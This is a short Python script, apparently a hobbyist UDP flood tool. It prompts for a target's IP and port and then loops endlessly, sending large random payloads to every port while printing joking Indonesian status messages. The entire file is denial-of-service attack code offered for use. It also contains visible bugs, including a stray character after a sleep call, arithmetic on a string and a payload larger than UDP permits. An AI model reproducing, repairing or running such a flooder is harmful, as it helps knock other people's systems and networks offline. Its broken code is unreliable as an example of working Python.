#Author WHITE L'
import socket
import os
import random
import time
import sys

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(50055)
bytes = random._urandom(50055)
bytes = random._urandom(510411)

os.system("clear")

ip = input("[+] Target's IP : ")
port = input("[+] Target's Port : ")
sent = input("[+] input sent packet : ")
ping = input("[+] input ping Tools : ") 
os.system("clear")
print("Mengirim Burger Hot...")
time.sleep(3)y
print("Mengirim Pizza Hot...")
time.sleep(3)
print("Mengirim Roti Donate...")
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        sent == 65535
        port = port + 1
        port == 65535
        ping = ping + 1
        ping == 65535
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
